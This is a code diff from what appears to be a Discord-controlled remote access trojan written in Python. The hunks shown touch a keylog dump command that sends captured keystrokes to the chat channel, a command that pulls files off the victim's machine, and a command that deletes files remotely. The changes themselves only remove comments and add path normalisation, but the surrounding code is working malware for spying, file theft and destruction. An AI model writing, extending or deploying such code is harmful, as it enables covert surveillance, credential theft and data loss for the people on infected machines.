@@ -1093,7 +1093,6 @@ async def keylog_cmd(ctx, action: str = None):
                 await ctx.send(file=discord.File(keylog_file))
             else:
                 await send_embed(ctx, "Keylog Dump", f"```{data}```", discord.Color.blue())
-            # Don't remove after dump - user can clear separately
         else:
             await send_embed(ctx, "Keylog", "No logs", discord.Color.red())
     else:
@@ -1265,13 +1264,9 @@ async def upload_file(ctx):
 @is_authorized()
 async def download_file(ctx, *, filepath: str):
     try:
-        # If path is relative, prepend current_path
         if not os.path.isabs(filepath):
             filepath = os.path.join(current_path, filepath)
-        
-        # Normalize path
         filepath = os.path.normpath(filepath)
-        
         if os.path.exists(filepath) and os.path.isfile(filepath):
             if os.path.getsize(filepath) > 104857600:
                 await send_embed(ctx, "Error", "File >100MB", discord.Color.red())
@@ -1485,6 +1480,7 @@ async def delete_file(ctx, *, filepath: str):
     try:
         if not os.path.isabs(filepath):
             filepath = os.path.join(current_path, filepath)
+        filepath = os.path.normpath(filepath)
         if os.path.exists(filepath):
             os.remove(filepath)
             await send_embed(ctx, "Deleted", filepath, discord.Color.red())
